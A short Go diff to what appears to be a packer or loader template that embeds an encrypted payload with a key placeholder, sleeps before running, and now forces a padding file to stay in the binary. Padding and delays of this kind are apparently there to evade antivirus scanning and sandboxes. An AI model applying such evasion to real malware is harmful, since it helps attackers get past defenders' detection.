@@ -264,7 +264,7 @@ import (
 var payload []byte
 
 //go:embed padding.bin
-var _ []byte
+var padding []byte
 
 const embeddedKeyHex = "{{KEY}}"
 const delayMs = {{DELAY_MS}}
@@ -354,6 +354,7 @@ func runPlain(plain []byte, args []string) error {
 }
 
 func main() {
+	runtime.KeepAlive(padding)
 	if delayMs > 0 {
 		time.Sleep(time.Duration(delayMs) * time.Millisecond)
 	}
